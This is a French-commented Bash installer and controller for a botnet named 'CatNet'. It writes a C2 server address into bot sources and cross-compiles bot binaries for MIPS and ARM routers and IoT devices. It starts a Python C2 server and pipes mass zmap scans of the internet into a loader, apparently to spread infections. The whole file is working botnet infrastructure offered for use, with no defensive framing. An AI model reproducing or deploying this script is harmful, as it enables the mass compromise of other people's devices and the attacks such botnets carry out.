#!/bin/bash

# CatNet Botnet - Smart Controller & Installer v3.0
# Amélioré pour être intelligent : Installe, Démarre ou Arrête selon l'état du système

# Couleurs pour une meilleure lisibilité
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Fonction de log
log() { echo -e "${BLUE}[$(date +'%H:%M:%S')]${NC} $1"; }
success() { echo -e "${GREEN}[+] $1${NC}"; }
warn() { echo -e "${YELLOW}[!] $1${NC}"; }
error() { echo -e "${RED}[ERR] $1${NC}"; exit 1; }

# Vérification root
if [ "$EUID" -ne 0 ]; then
  error "Ce script doit être exécuté en tant que root."
fi

# Fonctions d'état
is_installed() {
    [ -f "fiber" ] && [ -f "bot.mips" ] && [ -f "simple_c2.py" ]
}

is_running() {
    screen -ls | grep -E "c2_server|scanner_" > /dev/null
}

stop_all() {
    log "Arrêt de tous les services..."
    # Arrêter les sessions screen
    screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs -I{} screen -S {} -X quit 2>/dev/null
    # Tuer les processus sur les ports critiques
    fuser -k 1337/tcp 2>/dev/null
    fuser -k 2323/tcp 2>/dev/null
    fuser -k 80/tcp 2>/dev/null
    success "Tous les services ont été arrêtés."
}

start_all() {
    log "Démarrage des services..."
    ./start_c2.sh
    ./start_scanner.sh 80
    success "Services démarrés."
    log "Utilisez 'screen -ls' pour voir les sessions ou 'screen -r c2_server' pour l'admin."
}

install() {
    echo -e "${CYAN}╔════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║            INSTALLATION DE CATNET v3.0        ║${NC}"
    echo -e "${CYAN}╚════════════════════════════════════════════════╝${NC}"

    # Détecter l'IP publique
    PUBLIC_IP=$(curl -s https://api.ipify.org || echo "127.0.0.1")
    log "Détection de l'IP publique: ${CYAN}$PUBLIC_IP${NC}"
    echo -e "${YELLOW}[?] Entrez l'adresse IP du serveur C2 [Défaut: $PUBLIC_IP]:${NC}"
    read C2_IP
    C2_IP=${C2_IP:-$PUBLIC_IP}

    log "Optimisation système..."
    sysctl -w fs.file-max=1000000 >/dev/null
    ulimit -n 1000000

    log "Installation des dépendances..."
    apt update -qq
    apt install -y golang zmap gcc-multilib gcc-mips-linux-gnu gcc-arm-linux-gnueabi screen python3 python3-pip -qq

    log "Configuration des sources..."
    sed -i "s/c2ServerIP = \".*\"/c2ServerIP = \"$C2_IP\"/g" fiber.go
    sed -i "s/#define C2_SERVER \".*\"/#define C2_SERVER \"$C2_IP\"/g" bot.c

    log "Compilation de Fiber..."
    go build -ldflags="-s -w" -o fiber fiber.go
    chmod +x fiber

    log "Compilation des bots (MIPS & ARM)..."
    mips-linux-gnu-gcc -D__MIPS__ -static -o bot.mips bot.c >/dev/null 2>&1
    arm-linux-gnueabi-gcc -D__ARM__ -static -o bot.arm bot.c >/dev/null 2>&1
    
    # Génération des scripts de démarrage s'ils n'existent pas
    if [ ! -f "start_c2.sh" ]; then
        cat > start_c2.sh << EOL
#!/bin/bash
screen -dmS c2_server python3 simple_c2.py
EOL
        chmod +x start_c2.sh
    fi
    
    if [ ! -f "start_scanner.sh" ]; then
        cat > start_scanner.sh << EOL
#!/bin/bash
if [ \$# -ne 1 ]; then
  echo "Usage: \$0 <port>"
  exit 1
fi
PORT=\$1
# Limiter le débit de Zmap à 10 000 paquets/sec pour éviter de saturer le réseau/CPU
# et de faire crash le SSH
screen -dmS scanner_\$PORT bash -c "zmap -p\$PORT -r 10000 -q | ./fiber \$PORT"
EOL
        chmod +x start_scanner.sh
    fi

    success "Installation terminée."
}

# --- LOGIQUE PRINCIPALE ---

if ! is_installed; then
    warn "Installation non détectée ou incomplète."
    echo -e "${YELLOW}[?] Voulez-vous lancer l'installation ? (y/n)${NC}"
    read choice
    if [ "$choice" = "y" ]; then
        install
    else
        exit 0
    fi
fi

if is_running; then
    success "Le système est actuellement EN SERVICE."
    echo -e "${CYAN}--------------------------------------------------${NC}"
    screen -ls
    echo -e "${CYAN}--------------------------------------------------${NC}"
    echo -e "${YELLOW}[?] Que voulez-vous faire ?${NC}"
    echo -e " 1) Tout arrêter (Stop)"
    echo -e " 2) Redémarrer (Restart)"
    echo -e " 3) Ne rien faire (Quitter)"
    read choice
    case $choice in
        1) stop_all ;;
        2) stop_all; start_all ;;
        *) exit 0 ;;
    esac
else
    warn "Le système est installé mais ARRÊTÉ."
    echo -e "${YELLOW}[?] Voulez-vous démarrer les services ? (y/n)${NC}"
    read choice
    if [ "$choice" = "y" ]; then
        start_all
    fi
fi
